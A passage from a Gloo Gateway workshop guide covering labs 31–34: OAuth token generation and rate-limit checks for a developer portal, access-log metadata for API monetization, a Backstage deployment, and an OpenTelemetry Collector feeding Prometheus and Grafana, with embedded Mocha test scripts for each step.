    fs.writeFileSync('oauthClient', JSON.stringify(oauthClient));
  });
  
  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->
<!--bash
export CLIENT_ID=$(cat oauthClient | jq -r .clientId)
export CLIENT_SECRET=$(cat oauthClient | jq -r .clientSecret)
-->


Generate an access token using your client id and secret:

```bash
export APP_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "grant_type=client_credentials" \
  "$KEYCLOAK_URL/realms/portal-mgmt/protocol/openid-connect/token" |
  jq -r .access_token)

echo export APP_TOKEN=${APP_TOKEN}
```

Run the following command:

```bash,noexecute
for i in `seq 1 10`; do curl -k -H "Authorization: Bearer $APP_TOKEN" "https://bookinfo.example.com/api/bookinfo/v1" -I; done
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.APP_TOKEN}], retCode: 429 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->

You should get a `200` response code the first 5 time and a `429` response code after.




## Lab 32 - Dev portal monetization <a name="lab-32---dev-portal-monetization-"></a>

The `portalMetadata` section of the `ApiProduct` objects we've created previously is used to add some metadata in the access logs.

You can configure the access logs to take advantage of the metadata:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: ListenerOption
metadata:
  name: access-logging
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: Gateway
    name: http
  options:
    accessLoggingService:
      accessLog:
      - fileSink:
          path: /dev/stdout
          jsonFormat:
            "timestamp": "%START_TIME%"
            "server_name": "%REQ(:AUTHORITY)%"
            "response_duration": "%DURATION%"
            "request_command": "%REQ(:METHOD)%"
            "request_uri": "%REQ(X-ENVOY-ORIGINAL-PATH?:PATH)%"
            "request_protocol": "%PROTOCOL%"
            "status_code": "%RESPONSE_CODE%"
            "client_address": "%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%"
            "x_forwarded_for": "%REQ(X-FORWARDED-FOR)%"
            "bytes_sent": "%BYTES_SENT%"
            "bytes_received": "%BYTES_RECEIVED%"
            "user_agent": "%REQ(USER-AGENT)%"
            "downstream_local_address": "%DOWNSTREAM_LOCAL_ADDRESS%"
            "requested_server_name": "%REQUESTED_SERVER_NAME%"
            "request_id": "%REQ(X-REQUEST-ID)%"
            "response_flags": "%RESPONSE_FLAGS%"
            "route_name": "%ROUTE_NAME%"
            "upstream_cluster": "%UPSTREAM_CLUSTER%"
            "upstream_host": "%UPSTREAM_HOST%"
            "upstream_local_address": "%UPSTREAM_LOCAL_ADDRESS%"
            "upstream_service_time": "%REQ(x-envoy-upstream-service-time)%"
            "upstream_transport_failure_reason": "%UPSTREAM_TRANSPORT_FAILURE_REASON%"
            "correlation_id": "%REQ(X-CORRELATION-ID)%"
            "extauth": "%DYNAMIC_METADATA(envoy.filters.http.ext_authz)%"
            "api_version": "%DYNAMIC_METADATA(io.solo.gloo.portal:api_version)%"
            "api_product_id": "%DYNAMIC_METADATA(io.solo.gloo.portal:api_product_id)%"
            "api_product_name": "%DYNAMIC_METADATA(io.solo.gloo.portal:api_product_name)%"
            "lifecycle_phase": "%DYNAMIC_METADATA(io.solo.gloo.portal.custom_metadata:lifecyclePhase)%"
EOF
```

After that, you can send an API call:

```bash,noexecute
curl -k -H "Authorization: Bearer ${USER1_TOKEN}" "https://bookinfo.example.com/api/bookinfo/v1"
```

Now, let's check the logs of the Gateway:

```bash,noexecute
kubectl --context ${CLUSTER1} -n gloo-system logs deploy/gloo-proxy-http --tail 1 | jq .
```

You should get an output similar to this:

```json,nocopy
{
  "status_code": 200,
  "upstream_host": "10.101.0.33:9080",
  "requested_server_name": "bookinfo.cluster1.o5eqmcfvebyt.instruqt.io",
  "server_name": "bookinfo.cluster1.o5eqmcfvebyt.instruqt.io",
  "upstream_service_time": null,
  "timestamp": "2024-07-03T16:31:52.178Z",
  "api_version": "v1",
  "bytes_received": 0,
  "response_duration": 4,
  "lifecycle_phase": "Deprecated",
  "response_flags": "-",
  "request_protocol": "HTTP/2",
  "correlation_id": null,
  "downstream_local_address": "127.0.0.1:8443",
  "upstream_transport_failure_reason": null,
  "x_forwarded_for": null,
  "client_address": "127.0.0.1",
  "user_agent": "curl/7.81.0",
  "upstream_cluster": "kube-svc:bookinfo-productpage-9080_bookinfo",
  "bytes_sent": 395,
  "upstream_local_address": "10.101.0.23:53740",
  "api_product_name": "BookInfo REST API",
  "request_id": "cc8ac010-2327-452a-a463-3928b7ecbcde",
  "extauth": {
    "user_id": "d1d15ca3-cbd3-4060-a1f5-2d4e22ce8ec9"
  },
  "request_command": "GET",
  "route_name": "https~bookinfo_cluster1_o5eqmcfvebyt_instruqt_io-route-2-matcher-0",
  "request_uri": "/api/bookinfo/v1",
  "api_product_id": "bookinfo"
}
```

You can see several key information you can use for monetization purpose:
- the API name
- the user identity
- the custom metadata
- and everything about the request (method, path, status)

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Monetization is working", () => {
  it('Response contains all the required monetization fields', () => {
    const response = helpers.getOutputForCommand({ command: `curl -k -H "Authorization: Bearer ${process.env.USER1_TOKEN}" https://bookinfo.example.com/api/bookinfo/v1` });
    const output = JSON.parse(helpers.getOutputForCommand({ command: `kubectl --context ${process.env.CLUSTER1} -n gloo-system logs deploy/gloo-proxy-http --tail 1` }));
    expect(output.api_product_id).to.equals("bookinfo");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid from lab number 32"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 32"; exit 1; }
-->



## Lab 33 - Deploy Backstage with the backend plugin <a name="lab-33---deploy-backstage-with-the-backend-plugin-"></a>

Let's deploy Backstage:

```bash
kubectl --context ${CLUSTER1} apply -f data/steps/dev-portal-backstage-backend/rbac.yaml

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: backstage
  namespace: gloo-system
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backstage
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backstage
  template:
    metadata:
      labels:
        app: backstage
    spec:
      serviceAccountName: backstage
      containers:
        - name: backstage
          image: gcr.io/product-excellence-424719/portal-backstage-backend:v0.0.35
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 7007
          envFrom:
            - secretRef:
                name: postgres-secrets
          env:
          - name: PORTAL_DEBUG_LOGGING
            value: "true"
          - name: PORTAL_SERVER_URL
            value: "http://gateway-portal-web-server.gloo-system:8080/v1"
          - name: CLIENT_ID
            value: ${KEYCLOAK_CLIENT}
          - name: CLIENT_SECRET
            value: ${KEYCLOAK_SECRET}
          - name: SA_CLIENT_ID
            value: ${KEYCLOAK_CLIENT}
          - name: SA_CLIENT_SECRET
            value: ${KEYCLOAK_SECRET}
          - name: APP_CONFIG_backend_baseUrl
            value: https://backstage.example.com
          - name: TOKEN_ENDPOINT
            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/token"
          - name: AUTH_ENDPOINT
            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/auth"
          - name: LOGOUT_ENDPOINT
            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/logout"
          - name: NODE_TLS_REJECT_UNAUTHORIZED
            value: "0"
          - name: POSTGRES_HOST
            value: postgres
          - name: POSTGRES_PORT
            value: "5432"
          - name: PORTAL_SYNC_FREQUENCY_SECONDS
            value: "10"
---
apiVersion: v1
kind: Service
metadata:
  name: backstage
  namespace: gloo-system
spec:
  selector:
    app: backstage
  ports:
    - name: http
      port: 80
      targetPort: http
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy backstage
```

After that, you can expose Backstage through Gloo Gateway using a `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: backstage
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "backstage.example.com"
  rules:
    - backendRefs:
        - name: backstage
          port: 80
      matches:
      - path:
          type: PathPrefix
          value: /
EOF
```
Let's add the domain to our `/etc/hosts` file:

```bash
./scripts/register-domain.sh backstage.example.com ${PROXY_IP}
```

You can now access the `backstage` UI using this URL: [https://backstage.example.com](https://backstage.example.com).

<!--bash
echo -n Waiting for Backstage to finish processing APIs...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n gloo-system logs -l app=backstage 2>/dev/null | grep \"Transformed APIs into new entities\") ]]; do
  sleep 5
  echo -n .
done
echo"
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
const puppeteer = require('puppeteer');
var chai = require('chai');
var expect = chai.expect;

describe("APIs displayed properly in backstage", function() {
  let browser;
  let html;

  // Use Mocha's 'before' hook to set up Puppeteer
  beforeEach(async function() {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 40,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'], // needed for instruqt
    });
    let page = await browser.newPage();
    await page.goto(`https://backstage.example.com/api-docs`);
    await page.waitForNetworkIdle({ options: { timeout: 1000 } });

    await page.click('button');

    await page.waitForNavigation({ waitUntil: 'networkidle0' });

    html = await page.content();
  });

  // Use Mocha's 'after' hook to close Puppeteer
  afterEach(async function() {
    await browser.close();
  });

  it("The page contains bookinfo", () => {
    expect(html).to.contain("bookinfo");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid from lab number 33"
timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 33"; exit 1; }
-->



## Lab 34 - Deploy OpenTelemetry Collector <a name="lab-34---deploy-opentelemetry-collector-"></a>

Having metrics is essential for running applications reliably, and gateways are no exceptions.

Using [OpenTelemetry Collectors](https://github.com/open-telemetry/opentelemetry-collector-contrib) is a nice way to collect, transform, and ship telemetry to your observability backends.

Let's deploy the OSS distribution of OpenTelemetry Collector, and get started!

```bash
helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
helm repo update

helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
--version 0.97.1 \
--set mode=deployment \
--set image.repository="otel/opentelemetry-collector-contrib" \
--set command.name="otelcol-contrib" \
--namespace=otel \
--create-namespace \
-f -<<EOF
clusterRole:
  create: true
  rules:
  - apiGroups:
    - ''
    resources:
    - 'pods'
    - 'nodes'
    verbs:
    - 'get'
    - 'list'
    - 'watch'
ports:
  promexporter:
    enabled: true
    containerPort: 9099
    servicePort: 9099
    protocol: TCP
config:
  receivers:
    prometheus/gloo-dataplane:
      config:
        scrape_configs:
        # Scrape the Gloo Gateway pods
        - job_name: gloo-gateways
          honor_labels: true
          kubernetes_sd_configs:
          - role: pod
          relabel_configs:
            - action: keep
              regex: kube-gateway
              source_labels:
              - __meta_kubernetes_pod_label_gloo
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
              action: replace
              target_label: __metrics_path__
              regex: (.+)
            - action: replace
              source_labels:
              - __meta_kubernetes_pod_ip
              - __meta_kubernetes_pod_annotation_prometheus_io_port
              separator: ':'
              target_label: __address__
            - action: labelmap
              regex: __meta_kubernetes_pod_label_(.+)
            - source_labels: [__meta_kubernetes_namespace]
              action: replace
              target_label: kube_namespace
            - source_labels: [__meta_kubernetes_pod_name]
              action: replace
              target_label: pod
    prometheus/gloo-controlplane:
      config:
        scrape_configs:
        # Scrape the Gloo pods
        - job_name: gloo-gateways
          honor_labels: true
          kubernetes_sd_configs:
          - role: pod
          relabel_configs:
            - action: keep
              regex: gloo
              source_labels:
              - __meta_kubernetes_pod_label_gloo
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
              action: replace
              target_label: __metrics_path__
              regex: (.+)
            - action: replace
              source_labels:
              - __meta_kubernetes_pod_ip
              - __meta_kubernetes_pod_annotation_prometheus_io_port
              separator: ':'
              target_label: __address__
            - action: labelmap
              regex: __meta_kubernetes_pod_label_(.+)
            - source_labels: [__meta_kubernetes_namespace]
              action: replace
              target_label: kube_namespace
            - source_labels: [__meta_kubernetes_pod_name]
              action: replace
              target_label: pod
  exporters:
    prometheus:
      endpoint: 0.0.0.0:9099
    debug: {}
  service:
    pipelines:
      metrics:
        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
        processors: [batch]
        exporters: [prometheus]
EOF
```

This deployment will now scrape our Gateways' metrics, and expose these metrics in Prometheus format.

While you could scrape the Gateway pods directly as well, that might only work if you only want to consume them from the local cluster. Or, you could be standardizing on OpenTelemetry to avoid vendor/project specific agents. In this case, ingesting the metrics into an OTel Collector can make perfect sense, since you can freely transform telemetry data and ship to the backend of your liking.

For simplicity's sake, let's imagine that our desired backend is a local Prometheus instance. Let's get the telemetry data in to that one!

First, let's install kube-prometheus-stack!

```bash
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update

helm upgrade --install kube-prometheus-stack \
prometheus-community/kube-prometheus-stack \
--version 61.2.0 \
--namespace monitoring \
--create-namespace \
--values - <<EOF
grafana:
  service:
    type: LoadBalancer
    port: 3000
prometheus:
  prometheusSpec:
    ruleSelectorNilUsesHelmValues: false
    serviceMonitorSelectorNilUsesHelmValues: false
    podMonitorSelectorNilUsesHelmValues: false
EOF
```

Finally, configure scraping for our OTel Collector via a PodMonitor!

```bash
cat <<EOF | kubectl apply -n otel -f -
apiVersion: monitoring.coreos.com/v1
kind: PodMonitor
metadata:
  name: otel-monitor
spec:
  podMetricsEndpoints:
  - interval: 30s
    port: promexporter
    scheme: http
  selector:
    matchLabels:
      app.kubernetes.io/name: opentelemetry-collector
EOF
```

Now let's import a sample dashboard!

```bash
kubectl -n monitoring create cm envoy-dashboard \
--from-file=data/steps/deploy-otel-collector/envoy.json
kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
```

Let's generate some traffic!

```bash,noexecute,run
for i in {1..5}; do curl https://httpbin.example.com/get -v; done
```


To access Grafana, you need to get the endpoint using the following command:

```bash
echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):3000"
```


Login with `admin` and `prom-operator` you should be able to see how traffic flows trough your Gateways!

![Envoy dashboard](images/steps/deploy-otel-collector/envoy.png)




